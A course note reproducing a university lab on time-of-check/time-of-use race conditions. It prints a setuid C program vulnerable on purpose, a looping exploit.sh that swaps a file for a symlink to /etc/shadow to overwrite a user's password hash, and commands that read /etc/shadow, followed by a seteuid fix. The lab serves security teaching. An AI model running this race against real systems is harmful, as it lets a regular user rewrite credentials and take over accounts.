---
aliases: TOCTOU
tags: 50.005
---
[[50.005 Computer System Engineering|50.005]]

# Time-of-Check/Time-of-Use Bug (TOCTOU)
In this lab, you are tasked to investigate a program with TOCTOU (Time of Check - Time of Use) [[Race condition]] vulnerability.

The lab is written **entirely in C**, and it is more of an **investigative** lab with fewer coding components as opposed to our previous lab. At the end of this lab, you should be able to:

-   Understand what is a **TOUTOU bug** and why is it prone to attacks
-   Detect [[Race condition]] caused by the TOCTOU bug
-   Provide a **fix** to this TOCTOU vulnerability
-   **Examine** file permissions and modify them
-   Understand the concept of **privileged programs**: user level vs root level
-   **Compile** programs and make documents with different privilege level
-   Understand how **sudo** works
-   Understand the difference between **symbolic** and **hard** links

# Background
## Race Condition
[[Race condition]]

# Setup
## Installation

Download the files for this lab using the command:

```shell
git clone https://github.com/natalieagus/lab_toctou
```

You should find that the following files are given to you: ![](https://natalieagus.github.io/50005/assets/images/lab2/1.png)

Now go to the `User/` directory and call `make`. You should find these files in the end. ![](https://natalieagus.github.io/50005/assets/images/lab2/2.png)

Do **NOT** used a shared drive with your Host machine, or a shared external drive with other OS. You will NOT be able to create root files in this case. Clone the above file in /home/ directory instead.

## Login as Root User

### Task 1

`TASK 1:` To switch user and login as root, you must first set the **password** for the root account:

```
sudo passwd root
```

You will be prompted for your **current user** password, then set a new password for `root`.

Remember this `root` **password**! You need this later to switch to `root` user. If you have a brainblock, use a simple phrase like: `rotiprata`.

Follow the instructions, and then switch to the root user using the command and the password you just created above for `root`:

```
su root
```

You will see the following **new prompt**, indicating now you’re logged in as `root`: ![](https://natalieagus.github.io/50005/assets/images/lab2/3.png)

Root user is the user with the highest (administrative) privilege. It has **nothing to do with Kernel Mode**. Processes spawned while logged in as Root still runs on **User Mode**.

### Task 2

`TASK 2:` Create files while logged in as `root`.

Now while logged in as `root`, navigate to `/FilesForRoot`, and type `make`. You should see a new directory called `Root/` created with the following contents:

![](https://natalieagus.github.io/50005/assets/images/lab2/4.png)

It is **important** to check that the newly created files belong to the user root as shown in yellow above (beside the date is the `owner` of the file).

## adduser

### Task 3

`TASK 3:` Create 2-3 other users.

In order to proceed with this lab, you need to **login** as `root` and create a few **new** users before proceeding.

For the first user, do the following (the username must be `test-user-0`):

```
adduser test-user-0 
```

Give it any password you like (preferably a good one, like `LDcwzD&#6JKr`), and then add it to the `sudo` group:

```
adduser test-user-0 sudo
```

![](https://natalieagus.github.io/50005/assets/images/lab2/14.png)

Then add a few more with different names: e.g `test-user-0`, `test-user-1`, with any appropriate password of your choice.

## su

### Task 4

`TASK 4:` Switch account as any of these new users to ensure that you’ve created new users successfully.

You can switch to your new user by using the command `su <username>`:

![](https://natalieagus.github.io/50005/assets/images/lab2/15.png)

Once you’re done, **switch back** to `root` again using your `root` password you’ve set above.

### Task 5

`TASK 5:` Check `/etc/shadow`.

Once you’re done, you should enter the command `cat /etc/shadow` and see that your newly created users are at the bottom of the file, with some hash values (actual values are different depending on the password you set for these users).

![](https://natalieagus.github.io/50005/assets/images/lab2/16.png)

### Task 6

`TASK 6:` Return to your original user account.

You can switch back to your original normal user account by using the same `su <username>` command: ![](https://natalieagus.github.io/50005/assets/images/lab2/5.png)

Now go up one level by typing `cd ..` and attempt to **delete** `Root/` directory while logged in as your original **username**. You will find such permission denied message:

![](https://natalieagus.github.io/50005/assets/images/lab2/6.png)

What happened?

## File Permission

The reason you faced the **permission denied** error is because your username doesn’t have the correct **permission** to edit the `Root/` directory.

![](https://natalieagus.github.io/50005/assets/images/lab2/7.png)

Notice that a **directory** is an **executable**, indicated by the ‘x’ symbol.

## The SUID bit

SUID stand for Set Owner User ID. A file with **SUID** set always **executes** as the user who **owns** the file, regardless of the user passing the command.

List the file permission for all files inside `Root/` directory: ![](https://natalieagus.github.io/50005/assets/images/lab2/8.png)

Notice that instead of an `x`, we have an `s` type of permission listed on the two progs: `vulnerable_root_prog` and `rootdo`.

**This is called the SUID bit.**

The **SUID** bit allows **normal** user to gain **elevated privilege** (again this does **NOT** mean Kernel Mode, just privilege levels among regular users) when executing this program.

-   If a normal user executes this program, this program runs in root **privileges** (basically, the creator of the program)

### Task 7

`TASK 7:` Reading protected file using regular user account.

While logged in as your original user account, try to read the file `/etc/shadow`:

```
cat /etc/shadow
```

You will be met with **permission denied** because this file can only be read by `root` user, and other users in the **same group**, as shown in the file details below; ![](https://natalieagus.github.io/50005/assets/images/lab2/10.png)

What group does `root` belong to? What about the user account in question (ubuntu in example above)? You can find out using the command `groups`:

![](https://natalieagus.github.io/50005/assets/images/lab2/22.png)

### Task 8

`TASK 8:` Gain privilege elevation.

Now, run the following command. We assume that your **current working directory** is at `/lab_toctou` directory. If not, please adjust accordingly.

```
./Root/rootdo cat /etc/shadow
```

When prompted, type the word `password`, and then press enter.

You will find that you can now read this file: ![](https://natalieagus.github.io/50005/assets/images/lab2/9.png)

The **reason** you can now successfully read the file `/etc/shadow` is because `rootdo` **has the SUID bit**. Any other program that is **executed** by `rootdo` will run with `root` (`rootdo` creator) privileges and **not** the regular user.

You can open `rootdo.c` inside `/lab_toctou/FilesForRoot/` to examine how it works, especially this part where it just simply checks that you have keyed in `password` and proceed to `execvp` (execute) the input command:

```c
    if (!strcmp(password, "password"))
    { // on success, returns 0
        printf("Login granted\n");
        int pid = fork();
        if (pid == 0)
        {
            printf("Fork success\n");
            wait(NULL);
            printf("Children returned\n");
        }
        else
        {
            if (execvp(execName, argv_new) == -1)
            {
                perror("Executable not found\n");
            }
        }
    }
```

In short, as the **SUID** bit of rootdo program is set, it **always runs with root privileges** **regardless** of which user executes the program.

While rootdo seems like a **dangerous** program, don’t forget that the **root** itself was the one who made it and set the SUID bit in the first place, so yes it is indeed **meant to run that way**.

## sudo

This is in fact how your **sudo** program works. When you typo `sudo <command>`, it prompts you for your **password**, then the program checks whether the user is verified, before executing with root privileges. In our little `rootdo` example, we just use hardcoded `password` to proceed.

Setting of `rootdo`’s **SUID** bit is done in the `makefile` inside `FilesForRoot` that you execute earlier while logged in as root,

```shell
# refresh the root files and root log file
# Set UID for rootprog and rootdo
setup: 
	chmod u+s ../Root/vulnerable_root_prog 
	chmod u+s ../Root/rootdo
```

The command `chmod u+s filename` sets the `SUID` bit of that `filename`.

# The Vulnerable Root Program
Our vulnerable program is can be found in `/Root/vulnerable_root_prog`. Open `/FilesForRoot/vulnerable_root_prog.c` to find out what it does.

The program expects **two** arguments: to be stored at `char *fileName`, and `char *match`. It is a _supposedly secure_ program that will allow `root` to replace `*match` string inside `*fileName` with an SHA-512 hashed password `00000`.

```c
    if (argc < 3)
    {
        printf("ERROR, no file supplied, and no username supplied. Exiting now.\n");
        return 0;
    }

    char *fileName = argv[1];
    char *match = argv[2];
    FILE *fileHandler;

    ....
```

It will then **check** with the `access` **system call** on whether or not the caller of this program (it’s REAL ID) has **permission** to access the target `fileName`:

```c
    if (!access(fileName, W_OK))
    {
        printf("Access Granted \n");
        ....
        
    }
```

Below we paste the documentation for `access()` from Linux man page:

> `access()` checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.
> 
> The check is done using the calling process’s **real** `UID` and `GID`, rather than the **effective IDs** as is done when actually attempting an operation (e.g., open, fopen, execvp, etc) on the file. Similarly, for the root user, the check uses the set of permitted capabilities rather than the set of effective capabilities; and for non-root users, the check uses an empty set of capabilities.
> 
> This allows set-user-ID programs and capability-endowed programs to easily determine the invoking user’s authority. In other words, `access()` does not answer the “can I read/write/execute this file?” question. It answers a slightly different question: “(assuming I’m a setuid binary) **can the ACTUAL user who invoked me** read/write/execute this file?”, which gives set-user-ID programs the possibility to prevent malicious users from causing them to read files which users shouldn’t be able to read.”

Other system calls: `execvp`, `open` that we used in `rootdo` or standard `sudo` only checks the **effective** ID of the calling process, **not the real ID**.

`rootdo` runs with effective **root** privileges (**effective**, not real, since the caller to `rootdo` is only normal user), and that’s enough to run the `cat /etc/shadow` program since `cat` doesn’t utilise `access()` to check for the calling process.

On the other hand, `vulnerable_root_prog` **tries** to be more secure by using the `access` system call to **prevent users with elevated privileges to modify files that do not belong to them**.

However, `vulnerable_root_prog` “security” attempt fails miserably and ends up being susceptible to a particular race condition attack due this weakness called TOCTOU (time-of-check time-of-update)!

# TOCTOU Bug

The time-of-check to time-of-use (often abbreviated as `TOCTOU`, `TOCTTOU` or `TOC/TOU`) is a class of software bug caused by a race condition involving:

-   The **checking** of the state of a part of a system (such as this check in `vulnerable_root_prog` using `access`),
-   And the **actual use** of the results of that check

We **exaggerate** the `DELAY` between:

1.  The TIME of **CHECK** of the file using `access` and
2.  The TIME OF **USE** (actual usage of the file) using `fopen` by setting `sleep(DELAY)` in between the two instructions, where `DELAY` is specified as 1 to simulate 1 second delay.

```c
...
    if (!access(fileName, W_OK))
    {
        printf("Access Granted \n");
        /*Simulating the Delay*/
        sleep(DELAY); // sleep for 1 sec, exaggerate delay
        ...

        int byte_index = 0;
        int previous_byte_index = 0;
        int byte_match = -1;

        FILE *fp = fopen(fileName, "r+");
        ...
    }
```

Consider the `vulnerable_root_prog` being called by a user to modify a text file **belonging** to the user account as such: ![](https://natalieagus.github.io/50005/assets/images/lab2/11.png)

The `access()` check of course grants the normal user caller to modify `userfile.txt` because indeed it **belongs** to the normal user (**ubuntu** in the screenshot above).

The output doesn’t make sense as of now, but we will explain what those `hash` values are about really soon. The `vulnerable_root_prog` does two things:

1.  Accepts a `fileName` and a string inside that file to `match`.
2.  It will **replace** that string inside the file with the hash value: `$6$jPSpZ3iS84semtGU$DLwyTleAM2Of8NzDrwwNTnuSamJlnTx6NlMgbhPT5L8POT/J1MSCPucOAp1Qt3zRClS2NWT.RksROF9R1XLrn0` if `access()` system call grants permission.

## Symbolic Link

We will soon exploit this bug with **symbolic link**.

A **symbolic** link is a special kind of file that points to (reference) another file, much like a **shortcut** in Windows or a Macintosh alias. It contains a text string that is **automatically interpreted** and followed by the operating system as a path to another file or directory.

### Task 9

`TASK 9:` Creating symbolic link.

For instance, we can create a text file with:

```shell
echo "good morning" > goodmorning.txt
```

Then we can create a **symbolic link** using the command:

```shell
ln -s <source> <symlink>
```

In this example below, we created a `goodmorning_symlink.txt` that **points** to the actual file `goodmorning.txt`: ![](https://natalieagus.github.io/50005/assets/images/lab2/12.png)

## Exploiting the TOCTOU Bug with SymLink

During this **delay** between **checking** (with `access`) and **usage** (with `fopen`):

1.  A **malicious** attacker can **replace** the actual file `text.txt` into a **symbolic link** pointing to a protected file, e.g: `/etc/shadow`
2.  Since `fopen` only checks **effective** user ID, and `vulnerable_root_prog` has its `SUID` bit **set** (runs **effectively** as `root` despite being called by only normal user), the “supposedly secure” **rootprog** can end up allowing normal user to gain elevated privileges to **MODIFY** protected file like `/etc/shadow`.

In the screenshot below, we created a **symbolic link** `userfile.txt` to point to `/etc/shadow`, resulting in the regular user being unable to `cat userfile.txt`. ![](https://natalieagus.github.io/50005/assets/images/lab2/13.png)

We have written the program to create the symbolic link for you. It is inside `/User/symlink.c`.

## Race Condition
[[Race condition]]
The malicious attacker has to **attack** and can only **successfully** launch the attack (modifying `userfile.txt -> /etc/shadow`) during that **time window** between **time-of-check** (`access`) and **time-of-use** (`fopen`), hence the term “race condition vulnerability attack” or “a bug caused by race condition”.

The attacker has to literally **RACE** with the `vulnerable_root_prog` to **quickly** change the `userfile.txt` into a symbolic link pointing to `/etc/shadow` **ONLY** on this very specific time window of **AFTER** the `access()` check and **BEFORE** the `fopen()`.

# The Attack

## /etc/shadow

We will use this TOCTOU bug in `vulnerable_root_prog` to **modify** the content of the file: `/etc/shadow`.

`/etc/shadow` is **shadow** password file; a system file in **Linux** that stores **hashed** user passwords and is accessible only to the root user, preventing unauthorized users or malicious actors from breaking into the system.

Try reading it using `sudo cat /etc/shadow`. You will find that the lines have the following format:

```
usernm:$y$Apj1GQn.U$ZWWEtt19A8:17736:0:99999:7:::
[----] [---------------------] [---] - [---] ----
|                 |              |   |   |   |||+-----------> 9. Unused
|                 |              |   |   |   ||+------------> 8. Expiration date
|                 |              |   |   |   |+-------------> 7. Inactivity period
|                 |              |   |   |   +--------------> 6. Warning period
|                 |              |   |   +------------------> 5. Maximum password age
|                 |              |   +----------------------> 4. Minimum password age
|                 |              +--------------------------> 3. Last password change
|                 +-----------------------------------------> 2. Hashed Password
+-----------------------------------------------------------> 1. Username
```

Pay attention to segment **2**: It contains the password of the `usernm` using the `$type$salt$hashed` format. 1.`$type` is the method [[Hash functions|cryptographic hash]] **algorithm** and can have the following values:

-   `$1$` – [[MD5]]
-   `$2a$` – Blowfish
-   `$y$` – yescrypt
-   `$5$` – [[SHA-2|SHA-256]]
-   `$6$` – [[SHA-2|SHA-512]]

If the hashed password field contains an asterisk (\*) or exclamation point (!), the user will not be able to login to the system using password authentication. Other login methods like key-based authentication or switching to the user are still allowed (out of scope). You can read more about the file [here](https://www.cyberciti.biz/faq/understanding-etcshadow-file/) but it’s not crucial. Let’s move on.

## Replacing Hashed Password in /etc/shadow

We **aim** to:

1.  Replace the targeted `username` entry in `/etc/shadow` with a **new Hashed Password** section
2.  So that we can `login` to this targeted `username` using **preset password** `00000` (five zeroes), effectively **overriding** the password you set earlier.
3.  “We” being **regular user account** (NOT root!) but with the help of this TOCTOU bug from `vulnerable_root_prog`.

These targeted `username` is none other than `test-user-0` that you have created earlier.

### Task 10

`TASK 10:` Launch attack that does the 3 things above by running `exploit.sh`.

While logged in as a regular user (your original username), change your directory to `/User/` and run the script `exploit.sh`:

```shell
cd User
./exploit.sh
```

![](https://natalieagus.github.io/50005/assets/images/lab2/17.png)

The program will run for **awhile** (20-30 secs) and eventually **stop** with such message:

![](https://natalieagus.github.io/50005/assets/images/lab2/18.png)

If you do a `cat /etc/shadow` right now, notice how `test-user-0` account hashed password section has been changed to match that `replacement_text` in `vulnerable_root_prog`:

![](https://natalieagus.github.io/50005/assets/images/lab2/19.png)

## Login to target user account

### Task 11

`TASK :` Login to user account `test-user-0` with password `00000` Now you can login to `test-user-0` account with **password**: `00000` instead of your originally set password:

![](https://natalieagus.github.io/50005/assets/images/lab2/20.png)

We have **successfully** changed a supposedly **protected** `/etc/shadow` file while logged in as a **regular user** (ubuntu in the example above).

## What Happened?

Open `exploit.sh` file inside `/User/` directory:

```shell
#!/bin/sh
# exploit.sh

# note the backtick ` means assigning a command to a variable
OLDFILE=`ls -l /etc/shadow` 
NEWFILE=`ls -l /etc/shadow`

# continue until THE ROOT_FILE.txt is changed
while [ "$OLDFILE" = "$NEWFILE" ]
do
    rm -f userfile.txt
    # create userfile again
    cp userfile_original.txt userfile.txt
    
    # the following is done simultanously
    # if a command is terminated by the control operator &, the shell executes the command in the background in a subshell.
    # the shell does not wait for the command to finish, and the return status is 0.
    # on the other hand, commands separated by a ; are executed sequentially; the shell waits for each command to terminate in turn.
    # the return status is the exit status of the last command executed.
    ../Root/vulnerable_root_prog userfile.txt test-user-0 & ./symlink userfile.txt /etc/shadow & NEWFILE=`ls -l /etc/shadow`
    
done

echo "SUCCESS! The root file has been changed"
```

The first two lines create a variable called `OLDFILE` and `NEWFILE`, containing the file information of `/etc/shadow`.

```shell
OLDFILE=`ls -l /etc/shadow` 
NEWFILE=`ls -l /etc/shadow`
```

Then, the main loop is repeated **until** `/etc/shadow` is successfully changed (different **timestamp** and **size**):

1.  Remove existing `userfile.txt` if any (from previous loop)
2.  Then, create `userfile.txt` (this line can be replaced by any other instructions that create this `userfile.txt`)
3.  Then, runs 3 commands in **succession**:
    1.  `../Root/vulnerable_root_prog userfile.txt test-user-0`: runs the vulnerable program with `userfile.txt`, belonging to currently logged in user account and the **targeted** username.
    2.  `./symlink userfile.txt /etc/shadow`: immediately, executes the `symlink` program to change `userfile.txt` to **point** to `/etc/shadow`.
    3.  `NEWFILE=`ls -l /etc/shadow`: check the file info of` /etc/shadow `and store it into variable` NEWFILE`; to be used in the **next** loop check

Step (3.1) and (3.2) above are **racing**, and the script terminates when `/etc/shadow` has been successfully changed.

# The Fix

## seteuid()

One of the ways to **fix** this TOCTOU bug is to add just **one line of instruction** after `access()` (before `fopen()` is called) to manually set the effective UID of the process as the actual UID of the process.

You can do this using the following system call: `seteuid(getuid());`

### Task 12

`TASK 12:` Modify `vulnerable_root_prog.c` to add that **one line** of code above right under:

```c
if (!access(fileName, W_OK))
{
   ...
```

Then:

1.  **Login as root** and **recompile** with `make` inside `/FilesForRoot/`.
2.  Login back as your original user account, and cd to `/User/` again, and run `exploit.sh`.
3.  **Observe** the result
4.  Press `ctrl+c` to cancel the script (yes, this change will cause step 2 to run in infinite loop).

## Disable SUID

Of course another way is to **disable** the SUID bit of `vulnerable_root_prog` altogether, however in practice sometimes this might not be ideal since there might be other parts of the program that requires execution with elevated privilege, **temporarily**.

### Task 13

`TASK 13:` Run `exploit.sh` with `root_prog_nosuid`.

Open **exploit.sh** and replace `vulnerable_root_prog` with `root_prog_nosuid`, and run the script again (while logged in as user account).

# Summary

Ensure that you have answered all questions in edimension corresponding to each task in this handout. No other separate code submission is needed.

By the end of this lab, we hope that you have learned:

-   What **SUID** bit does, and how can it be utilised to gain elevated privileges to access protected files
-   The differences between **root** and **normal** user
-   The meaning of file **permission**. Although we do not go through explicitly on how it is set, you can read about it [here](https://kb.iu.edu/d/abdb) and experiment how to do it using the `chmod` command.
-   How **race condition** happens and how it can be used as an **attack**
-   How to **fix** the TOCTOU bug

# TL;DR

1.  Clone the repository:
    
    ```shell
    git clone https://github.com/natalieagus/lab_toctou
    ```
    
2.  Set root’s password, and login as `root`:
    
    ```shell
    sudo passwd root
    su root 
    ```
    
3.  Create other users (while logged in as root). Use a **good** password, like `LDcwzD&#6JKr`:
    
    ```shell
    adduser test-user-0
    adduser test-user-0 sudo
    adduser test-user-1
    adduser test-user-1 sudo
    adduser test-user-2
    adduser test-user-2 sudo
    ```
    
4.  `make` inside `/FilesForRoot/` folder (while logged in as root):
    
    ```shell
    cd FilesForRoot
    make
    ```
    
5.  Log in back to your regular user account:
    
    ```shell
    su <username>
    ```
    
6.  Change to `/User/` directory, `make`, then **exploit**:
    
    ```shell
    cd ../User
    make
    ./exploit.sh
    ```
    
7.  Once `exploit.sh` succeeds, login to `test-user-0` with password `00000`. This proves that the attack has been successfully launched.